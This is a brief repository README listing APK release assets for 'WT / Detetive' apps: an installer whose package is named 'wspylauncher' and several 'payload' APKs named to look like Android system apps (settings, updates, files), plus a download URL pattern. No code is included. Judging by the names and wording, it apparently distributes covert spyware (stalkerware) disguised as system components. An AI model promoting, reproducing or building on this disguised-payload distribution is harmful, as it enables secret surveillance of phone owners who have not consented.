# apps

APK distribution for WT / Detetive apps.

Binaries are published under [Releases](../../releases) (files exceed GitHub's
100 MB in-repo limit, so they are stored as release assets).

## Releases

### `apk1`

Payload APKs downloaded by the installer, plus the installer itself. Two
variants of each payload: `_wt` and `_detetive`.

| Asset | Purpose |
|-------|---------|
| `android_wt.apk` / `android_detetive.apk` | "Android" payload |
| `ajustes_wt.apk` / `ajustes_detetive.apk` | "Ajustes" (settings) payload |
| `atts_wt.apk` / `atts_detetive.apk` | "Atualizações" (updates) payload |
| `arquivos_wt.apk` / `arquivos_detetive.apk` | "Arquivos" (files) payload |
| `instalador_wt.apk` / `instalador_detetive.apk` | Installer app (`com.example.wspylauncher`) |

Download URL pattern:

```
https://github.com/wts-apps/apps/releases/download/apk1/<asset>.apk
```
